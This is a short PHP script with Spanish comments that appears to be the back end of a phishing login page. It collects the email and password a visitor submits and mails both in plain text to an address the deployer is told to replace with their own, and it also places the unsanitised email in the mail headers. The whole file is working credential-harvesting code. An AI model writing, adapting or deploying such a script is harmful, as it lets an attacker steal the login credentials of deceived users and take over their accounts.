<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // Cambia esta dirección de correo electrónico por la tuya
    $to = "tucorreo@example.com";
    $subject = "Datos de acceso";
    $message = "Correo electrónico: $email \nContraseña: $password";
    $headers = "From: $email";

    // Envía el correo electrónico
    if (mail($to, $subject, $message, $headers)) {
        echo "¡Correo enviado correctamente!";
    } else {
        echo "Error al enviar el correo.";
    }
}
?>
